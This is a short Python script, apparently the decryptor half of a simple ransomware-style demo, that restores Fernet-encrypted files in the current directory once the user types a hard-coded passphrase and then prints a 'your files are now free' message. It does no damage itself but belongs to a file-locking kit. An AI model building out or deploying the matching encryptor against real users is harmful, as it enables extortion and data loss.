#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
	if file == 'encrypt.py' or file == 'decrypt.py' or file == 'thekey.key':
		continue
	if os.path.isfile(file):
		files.append(file)

secret_message = "its_a_secret"
user_input = input("Enter the secret message from me\n")

with open("thekey.key","rb") as key_file:
	key = key_file.read()

if user_input == secret_message:
	for file in files:
		with open(file,"rb") as the_file:
			contents = the_file.read()
		decrypted_contents = Fernet(key).decrypt(contents)
		with open(file,"wb") as the_file:
			the_file.write(decrypted_contents)
	print("Your files are now free, have a cup of coffee and relax!")
else:
	print("OHh child!, please enter the secret message")


